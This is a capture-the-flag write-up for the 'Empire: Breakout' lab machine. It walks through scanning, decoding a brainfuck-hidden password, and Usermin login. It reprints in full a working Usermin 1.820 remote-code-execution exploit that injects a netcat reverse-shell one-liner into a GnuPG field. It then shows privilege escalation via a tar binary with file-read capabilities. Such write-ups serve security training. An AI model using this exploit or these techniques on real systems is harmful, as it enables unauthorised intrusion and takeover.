 # Empire: Breakout Writeup
 ```bash
Description:
Difficulty: Easy

This box was created to be an Easy box, but it can be Medium if you get lost.

For hints discord Server ( https://discord.gg/7asvAhCEhe )
```
\

# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.111/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.1     f0:a7:31:e9:bb:f8      1      60  TP-Link Systems Inc                                                                                                                                            
 192.168.0.100   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.112   08:00:27:b7:db:52      1      60  PCS Systemtechnik GmbH
```
\
Next, Open Ports
```bash
PORT      STATE SERVICE          REASON
80/tcp    open  http             syn-ack ttl 64
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)

```
\
Accessing port 80
\
<img width="1423" height="481" alt="image" src="https://github.com/user-attachments/assets/d9234d42-8e63-4442-bb87-3357b6b4b375" />
\
When i checked its source content and scrolled down
\
<img width="1698" height="696" alt="image" src="https://github.com/user-attachments/assets/d80594e2-f864-48c3-8b6b-f5a60f418d8e" />
\
```bash
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->
```

\
This is basically brainfuck language, and we can just use compilers online
\

<img width="984" height="292" alt="image" src="https://github.com/user-attachments/assets/6a4b6178-9909-4489-a752-52c05a7e4c91" />
\
So ,we have a password but not a username , so i run it and get "Unix User\cyber (Local User)"
\
Now , i try to login into the service on port 20000 with the credentials
\
<img width="229" height="766" alt="image" src="https://github.com/user-attachments/assets/ac6994fc-2813-42cb-8bdc-c97f946cb806" />
\
We see the version of usermin , so i check searchsploit
```bash
searchsploit usermin 1.8
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)                                                                                                                      | linux/webapps/50234.py
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                                     | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                                                                                     | multiple/remote/2017.pl
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -------------------------
```
\
This is the exploit
```bash
# Title: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
# Date: 27.08.2021
# Author: Numan Türle
# Vendor Homepage: https://www.webmin.com/usermin.html
# Software Link: https://github.com/webmin/usermin
# Version: <=1820
# https://www.youtube.com/watch?v=wiRIWFAhz24

#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Usermin - Remote Code Execution (Authenticated) ( Version 1.820 )
# author: twitter.com/numanturle
# usage: usermin.py [-h] -u HOST -l LOGIN -p PASSWORD
# https://youtu.be/wiRIWFAhz24


import argparse,requests,warnings,json,re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from cmd import Cmd

warnings.simplefilter('ignore',InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser(description='Usermin - Remote Code Execution (Authenticated) ( Version 1.820 )')
    parser.add_argument('-u','--host',help='Host', type=str, required=True)
    parser.add_argument('-l', '--login',help='Username', type=str, required=True)
    parser.add_argument('-p', '--password',help='Password', type=str, required=True)
    args = parser.parse_args()
    exploit(args)

def exploit(args):

    listen_ip = "0.0.0.0"
    listen_port = 1337

    session = requests.Session()
    target = "https://{}:20000".format(args.host)
    username = args.login
    password = args.password

    print("[+] Target {}".format(target))

    headers = {
        'Cookie': 'redirect=1; testing=1;',
        'Referer': target
    }

    login = session.post(target+"/session_login.cgi", headers=headers, verify=False, data={"user":username,"pass":password})
    login_content = str(login.content)
    search = "webmin_search.cgi"
    check_login_string = re.findall(search,login_content)
    if check_login_string:
        session_hand_login = session.cookies.get_dict()

        print("[+] Login successfully")
        print("[+] Setup GnuPG")

        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f;".format(listen_ip,listen_port)
        #payload = "whoami;"
        post_data = {
            "name":'";{}echo "'.format(payload),
            "email":"1337@webmin.com",
        }
        
        print("[+] Payload {}".format(post_data))

        session.headers.update({'referer': target})
        
        create_secret = session.post(target+"/gnupg/secret.cgi", verify=False, data=post_data)
        create_secret_content = str(create_secret.content)

        search = "successfully"
        check_exp = re.findall(search,create_secret_content)
        
        if check_exp:
            
            print("[+] Setup successful")
            print("[+] Fetching key list")
            
            session.headers.update({'referer': target})
            key_list = session.post(target+"/gnupg/list_keys.cgi", verify=False)
            last_gets_key = re.findall("edit_key.cgi\?(.*?)'",str(key_list.content))[-2]
            print("[+] Key : {}".format(last_gets_key))

            session.headers.update({'referer': target})
            try:
                key_list = session.post(target+"/gnupg/edit_key.cgi?{}".format(last_gets_key), verify=False, timeout=3)
            except requests.exceptions.ReadTimeout:
                pass

            print("[+] 5ucc355fully_3xpl017")
        else:
            print("[-] an unexpected error occurred"  )



        
    else:
        print("[-] AUTH : Login failed.")

if __name__ == "__main__":
    init()
```
\
This exploit basically uses a GnuPG vuln to execute code
\
We have to change the     listen_ip = "0.0.0.0"     listen_ip = "0.0.0.0"  listen_port = 1337 under the exploit function in the script
\
I tried it , but then i couldnt get it to work , i tried to manually do the exploit , still failed
\
So i checked the dashhboard and i saw a file manager
\
<img width="1726" height="736" alt="image" src="https://github.com/user-attachments/assets/ab815788-7e47-40e7-ab99-88ef38e605e5" />
\
So i thought i can access files , so lets upload a reverse shell and access it , but then i noticed a small terminal symbol on the bottom left
\
<img width="232" height="29" alt="image" src="https://github.com/user-attachments/assets/1ef349dd-7608-4dea-a806-17332a242a5c" />
\
When i clicked it , it gave me a webshell as user "cyber"
\
<img width="1715" height="366" alt="image" src="https://github.com/user-attachments/assets/eb2f2311-0f76-4d9f-901e-36c775ec5a4c" />
\
So easy
```bash
[cyber@breakout ~]$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}
```
\
Then i checked SUID and Capabilities files
```bash
[cyber@breakout tmp]$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
```
\
And i saw that a file without our domain has capabiities
```bash
"CAP_DAC_READ_SEARCH", the description of which reads:  "Bypass file read permission checks and directory read and execute permission checks"
```
\
So we can just make a tar archive of that file and then extract it to read it
\
then i used linpeas and it found a backup file
```bash
cyber@breakout tmp]$ cd /var/backups
[cyber@breakout backups]$ ls -la
total 480
drwxr-xr-x  2 root root   4096 Feb 10 06:31 .
drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
-rw-r--r--  1 root root  40960 Feb 10 06:31 alternatives.tar.0
-rw-r--r--  1 root root  12732 Oct 19  2021 apt.extended_states.0
-rw-r--r--  1 root root      0 Feb 10 06:31 dpkg.arch.0
-rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
-rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
-rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
-rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
```
\
So Lets read this file using the tar at /home/cyber
```bash
[cyber@breakout backups]$ /home/cyber/tar -cf /tmp/old_pass.tar /var/backups/.old_pass.bak
```
We get
```bash
[cyber@breakout tmp]$ tar -xvf old_pass.tar
var/backups/.old_pass.bak
[cyber@breakout tmp]$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
[cyber@breakout tmp]$
```
\
I tried changing my user to root in webshell , but it was not happening , so i had to get a local shell and change
```bash
cyber@breakout:/tmp$ su root
Password: 
root@breakout:/tmp# cd /root
root@breakout:~# ls -la
total 40
drwx------  6 root root 4096 Oct 20  2021 .
drwxr-xr-x 18 root root 4096 Oct 19  2021 ..
-rw-------  1 root root  281 Oct 20  2021 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 19  2021 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root  100 Oct 19  2021 rOOt.txt
drwx------  2 root root 4096 Oct 19  2021 .spamassassin
drwxr-xr-x  2 root root 4096 Oct 19  2021 .tmp
drwx------  6 root root 4096 Oct 19  2021 .usermin
root@breakout:~# cat rOOt.txt 
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```
\
The End , Thank You for reading till here
